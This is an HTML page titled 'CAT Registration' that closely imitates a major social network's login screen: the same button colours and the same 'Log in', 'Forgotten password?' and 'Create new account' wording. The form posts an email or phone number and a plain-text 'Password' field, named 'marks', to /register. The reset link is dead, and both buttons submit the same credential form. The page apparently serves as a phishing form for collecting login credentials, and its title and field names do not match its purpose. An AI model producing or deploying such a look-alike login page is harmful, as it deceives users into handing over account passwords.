<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CAT Registration</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;min-height:100vh;background:#fff;color:#1c1e21;font-family:Arial,Helvetica,sans-serif;display:flex;align-items:center;justify-content:center}
    .form-wrap{width:min(446px,calc(100% - 48px));margin-top:28px}
    .heading{font-size:16px;margin:0 0 25px;font-weight:400}
    input{display:block;width:100%;height:60px;border:1px solid #d5d8dc;border-radius:16px;padding:0 17px;margin-bottom:12px;font-size:15px;color:#1c1e21;outline:none;background:#fff}
    input:focus{border-color:#1877f2}
    input::placeholder{color:#606770;opacity:1}
    .login{width:100%;height:45px;margin-top:12px;border:1px solid #0866ff;border-radius:24px;background:#0866e9;color:#fff;font-size:15px;cursor:pointer}
    .forgot{display:block;text-align:center;margin:24px 0 64px;color:#1c1e21;text-decoration:none;font-size:15px}
    .create{width:100%;height:45px;border:1px solid #1877a5;border-radius:24px;background:#fff;color:#21618c;font-size:15px;cursor:pointer}
    @media(max-height:520px){body{align-items:flex-start}.form-wrap{margin:40px auto}.forgot{margin-bottom:36px}}
  </style>
</head>
<body>
  <main class="form-wrap">
    <p class="heading">Log in</p>
    <form action="/register" method="POST">
      <input type="text" name="contact" placeholder="Email address or mobile number" autocomplete="email" required>
      <input type="text" name="marks" placeholder="Password
        " inputmode="decimal" required>
      <button class="login" type="submit">Log in</button>
    </form>
    <a class="forgot" href="#" onclick="return false;">Forgotten password?</a>
    <button class="create" type="button" onclick="document.querySelector('form').requestSubmit()">Create new account</button>
  </main>
</body>
</html>
